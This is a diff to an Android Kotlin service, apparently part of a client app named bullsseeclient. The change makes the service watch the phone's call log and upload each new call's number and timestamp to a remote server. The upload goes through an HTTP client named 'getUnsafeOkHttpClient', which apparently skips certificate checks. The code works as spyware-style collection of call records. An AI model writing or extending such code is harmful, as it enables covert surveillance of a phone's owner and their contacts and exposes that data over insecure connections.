@@ -9,8 +9,11 @@ import android.content.Intent
 import android.os.Build
 import android.os.IBinder
 import android.provider.CallLog
-import android.telephony.PhoneStateListener
-import android.telephony.TelephonyManager
+import android.database.Cursor
+import android.database.ContentObserver
+import android.net.Uri
+import android.os.Handler
+import android.os.HandlerThread
 import androidx.core.app.NotificationCompat
 import com.example.bullsseeclient.HttpClient
 import okhttp3.MediaType.Companion.toMediaType
@@ -20,21 +23,26 @@ import retrofit2.converter.gson.GsonConverterFactory
 import java.time.Instant
 
 class SmsCallMonitorService : Service() {
+    private var observerThread: HandlerThread? = null
+    private var callLogObserver: ContentObserver? = null
+    private var lastSentId: Long = -1L
     override fun onBind(intent: Intent?): IBinder? = null
 
     override fun onCreate() {
         super.onCreate()
         android.util.Log.d("SmsCallMonitorService", "onCreate")
         startForeground()
-        val tm = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
-        tm.listen(object : PhoneStateListener() {
-            override fun onCallStateChanged(state: Int, phoneNumber: String?) {
-                android.util.Log.d("SmsCallMonitorService", "state=$state number=$phoneNumber")
-                if (state == TelephonyManager.CALL_STATE_OFFHOOK || state == TelephonyManager.CALL_STATE_RINGING) {
-                    sendCallEvent(phoneNumber)
-                }
+        observerThread = HandlerThread("CallLogObserver").also { it.start() }
+        val handler = Handler(observerThread!!.looper)
+        callLogObserver = object : ContentObserver(handler) {
+            override fun onChange(selfChange: Boolean) {
+                onChange(selfChange, null)
             }
-        }, PhoneStateListener.LISTEN_CALL_STATE)
+            override fun onChange(selfChange: Boolean, uri: Uri?) {
+                processLatestCall()
+            }
+        }
+        contentResolver.registerContentObserver(CallLog.Calls.CONTENT_URI, true, callLogObserver!!)
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -55,15 +63,15 @@ class SmsCallMonitorService : Service() {
         startForeground(1001, notification)
     }
 
-    private fun sendCallEvent(number: String?) {
-        android.util.Log.d("SmsCallMonitorService", "sendCallEvent number=$number")
+    private fun sendCallEventFromLog(number: String?, date: Long) {
+        android.util.Log.d("SmsCallMonitorService", "sendCallEventFromLog number=$number date=$date")
         val retrofit = Retrofit.Builder()
             .baseUrl(HttpClient.BASE_URL)
             .addConverterFactory(GsonConverterFactory.create())
             .client(HttpClient.getUnsafeOkHttpClient())
             .build()
         val api = retrofit.create(Api::class.java)
-        val payload = listOf(CallDto(number = number, date = Instant.now().toEpochMilli()))
+        val payload = listOf(CallDto(number = number, date = date))
         val body = RequestBody.create("application/json".toMediaType(), com.google.gson.Gson().toJson(payload))
         api.send(body).enqueue(object : retrofit2.Callback<Void> {
             override fun onResponse(call: retrofit2.Call<Void>, response: retrofit2.Response<Void>) {
@@ -73,6 +81,39 @@ class SmsCallMonitorService : Service() {
                 android.util.Log.e("SmsCallMonitorService", "upload error=${t.message}")
             }
         })
+    }
+
+    
+
+    private fun processLatestCall() {
+        val uri = CallLog.Calls.CONTENT_URI
+        val projection = arrayOf(CallLog.Calls._ID, CallLog.Calls.NUMBER, CallLog.Calls.DATE)
+        val sortOrder = CallLog.Calls.DATE + " DESC"
+        var cursor: Cursor? = null
+        try {
+            cursor = contentResolver.query(uri, projection, null, null, sortOrder)
+            if (cursor != null && cursor.moveToFirst()) {
+                val id = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls._ID))
+                val number = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER))
+                val date = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE))
+                if (id != lastSentId) {
+                    lastSentId = id
+                    sendCallEventFromLog(number, date)
+                }
+            }
+        } catch (e: SecurityException) {
+            android.util.Log.e("SmsCallMonitorService", "READ_CALL_LOG not granted: ${e.message}")
+        } catch (e: Exception) {
+            android.util.Log.e("SmsCallMonitorService", "CallLog observer query error: ${e.message}")
+        } finally {
+            cursor?.close()
+        }
+    }
+
+    override fun onDestroy() {
+        super.onDestroy()
+        if (callLogObserver != null) contentResolver.unregisterContentObserver(callLogObserver!!)
+        observerThread?.quitSafely()
     }
 
     interface Api {
